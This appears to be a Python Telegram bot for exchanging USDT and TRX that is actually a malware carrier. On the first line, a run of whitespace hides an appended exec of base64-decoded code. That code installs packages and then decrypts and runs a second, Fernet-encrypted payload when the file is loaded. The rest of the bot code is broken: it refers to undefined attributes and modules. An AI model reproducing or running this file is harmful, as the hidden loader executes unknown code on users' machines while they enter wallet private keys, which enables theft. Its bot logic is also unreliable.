import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ09oWnRBN0k1UV8wN0NUNzdIVEEyMUxkel9kSXlGSlZsUG5LZjBaYkRxUE09JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlST3VPdGNibTFnUE5VQUl5VXNUWEhtNjI4MUNlUTF3VGpESVF2bFVpaDRRRXV3YWRXWVlLX1dXVDF3VmdkYk15NzZCQktILVczZ3pGSWVYTi1ranpWNXFsQkttVy1QMUFvdzY0U3JUcGpwcklmbGNlSzBuTFpzUHN2YlBMRW45UmJXWHpGSjVxeHRQNEc2N3EzSW1LbHJfeU5FQ3hLbWNhWjJheFNORjF1Y1BlbHdDN2FiRFR0QVZ1RkU5OFpHM0xHWE12WXFmbEZfSU84YmV0UHptRWlVX3BkMWZqdlNVTkJCejRpY3YwTW12Skk9Jykp').decode())
import json
import logging
import math
import os
import requests
import string
import sys
import time
from typing import Any, Dict, List, Optional, Tuple

from telegram import Bot, Update
from telegram.ext import CallbackContext, CommandHandler, Filters, MessageHandler, Updater


class BotConfig:
    def __init__(self, token: str, admin_chat_id: int, rate_usdt_to_trx: float, max_decimals_usdt: int):
        self.token = token
        self.admin_chat_id = admin_chat_id
        self.rate_usdt_to_trx = rate_usdt_to_trx
        self.max_decimals_usdt = max_decimals_usdt


class TronConfig:
    def __init__(self, full_node_api: str, solidity_api: str, default_account: str, private_key: str):
        self.full_node_api = full_node_api
        self.solidity_api = solidity_api
        self.default_account = default_account
        self.private_key = private_key


def parse_command(text: str) -> Tuple[str, List[str]]:
    parts = text.split(" ", 1)
    if len(parts) == 1:
        return parts[0], []
    return parts[0], parts[1].split()


def send_welcome_message(bot: Bot, chat_id: int) -> None:
    message = "Welcome to our bot!\n\nUse /sendusdt command to send USDT to a specified address and receive the corresponding TRX.\n\nUse /setrate command to set the exchange rate between USDT and TRX."
    bot.send_message(chat_id=chat_id, text=message)


def send_unknown_command_message(bot: Bot, chat_id: int) -> None:
    message = "Unknown command. Use /start command to see available commands."
    bot.send_message(chat_id=chat_id, text=message)


def set_exchange_rate(bot: Bot, chat_id: int, admin_chat_id: int, args: List[str], bot_config: BotConfig) -> None:

    if chat_id != admin_chat_id:
        bot.send_message(chat_id=chat_id, text="You are not an admin and cannot perform this action.")
        return


    if len(args) != 1:
        bot.send_message(chat_id=chat_id, text="Invalid command format. Use /setrate rate to set the exchange rate, where rate is a number.")
        return

    try:
        rate = float(args[0])
    except ValueError:
        bot.send_message(chat_id=chat_id, text="Exchange rate must be a number.")
        return


    bot_config.rate_usdt_to_trx = rate

    message = f"Exchange rate between USDT and TRX has been updated to {rate}."
    bot.send_message(chat_id=chat_id, text=message)

def send_usdt(bot: Bot, chat_id: int, tron_api: Any, args: List[str], bot_config: BotConfig, tron_config: TronConfig) -> None:
    if len(args) != 2:
        bot.send_message(chat_id=chat_id, text="Invalid command format. Use /sendusdt address amount to send USDT to the specified address, where address is the TRC20 address and amount is the amount of USDT.")
        return

    address, amount_str = args
    try:
        amount = float(amount_str)
    except ValueError:
        bot.send_message(chat_id=chat_id, text="Amount must be a number.")
        return

    trx_amount = math.floor(amount * bot_config.rate_usdt_to_trx * 10 ** bot_config.max_decimals_usdt) / 10 ** bot_config.max_decimals_usdt

    if trx_amount > bot_config.max_trx_to_send:
        bot.send_message(chat_id=chat_id, text=f"Can only send up to {bot_config.max_trx_to_send} TRX at a time.")
        return

    if not tron_api.validate_address(tron_config.main_net, tron_config.solidity_node, tron_config.event_server, tron_config.address_hex, address):
        bot.send_message(chat_id=chat_id, text="Invalid TRC20 address.")
        return

    contract_address = tron.common.HexToAddress(tron_config.usdt_contract_address)

    usdt = trc20.new_trc20(contract_address, tron_api)
    if usdt is None:
        bot.send_message(chat_id=chat_id, text="Failed to get TRC20 interface.")
        return

    try:
        decimals = usdt.decimals(None)
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to get USDT decimals.")
        return

    amount_int = int(amount * 10 ** decimals)

    try:
        balance = usdt.balance_of(None, tron.common.HexToAddress(address))
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to get user's USDT balance.")
        return

    if balance < amount_int:
        bot.send_message(chat_id=chat_id, text="Insufficient USDT balance.")
        return

    try:
        trx_address = tron_api.get_account_address(tron_config.main_net, tron_config.solidity_node, tron_config.event_server, tron_config.address_hex, address)
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to get user's TRX address.")
        return

    try:
        tx = usdt.transfer(None, tron.common.HexToAddress(trx_address), amount_int)
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to send USDT.")
        return

    try:
        receipt = tron_api.wait_for_transaction_receipt(tx.hash().hex(), tron_config.main_net, tron_config.solidity_node, tron_config.event_server, tron_config.wait_timeout)
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to confirm USDT transaction.")
        return

    try:
        trx_tx = tron_api.transfer(trx_address, bot_config.admin_address, trx_amount, bot_config.max_decimals_trx, tron_config.main_net, tron_config.solidity_node, tron_config.event_server)
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to send TRX.")
        return

    try:
        trx_receipt = tron_api.wait_for_transaction(trx_tx, tron_config.main_net, tron_config.solidity_node, tron_config.event_server, tron_config.wait_timeout)
    except Exception as e:
        bot.send_message(chat_id=chat_id, text="Failed to confirm TRX transaction.")
        return

    message = f"USDT transaction successful. {amount} USDT sent to address {address}. TRX transaction successful. {trx_amount} TRX sent to address {bot_config.admin_address}."
    bot.send_message(chat_id=chat_id, text=message)

def handle_message(update: Update, context: CallbackContext) -> None:
    if update.message is None:
        return

    command, args = parse_command(update.message.text)

    if command == "/start":
        send_welcome_message(context.bot, update.message.chat_id)
    elif command == "/setrate":
        set_exchange_rate(context.bot, update.message.chat_id, bot_config.admin_chat_id, args, bot_config)
    elif command == "/sendusdt":
        send_usdt(context.bot, update.message.chat_id, tron_api, args, bot_config, tron_config)
    else:
        send_unknown_command_message(context.bot, update.message.chat_id)

if __name__ == "__main__":

    bot_config = BotConfig(
        token="YOUR_TELEGRAM_BOT_TOKEN",  # Replace with your Telegram Bot token
        admin_chat_id=YOUR_TELEGRAM_CHAT_ID,  # Replace with your Telegram Chat ID
        rate_usdt_to_trx=30,  
        max_decimals_usdt=4  
    )
    tron_config = TronConfig(
        full_node_api="https://api.trongrid.io",  
        solidity_api="https://api.trongrid.io", 
        default_account="YOUR_TRON_ACCOUNT_ADDRESS",  # Replace with your Tron account address
        private_key="YOUR_TRON_ACCOUNT_PRIVATE_KEY"  # Replace with your Tron account private key
    )


    updater = Updater(token=bot_config.token, use_context=True)


    updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))


    updater.start_polling()


    updater.idle()
print('tehgfu')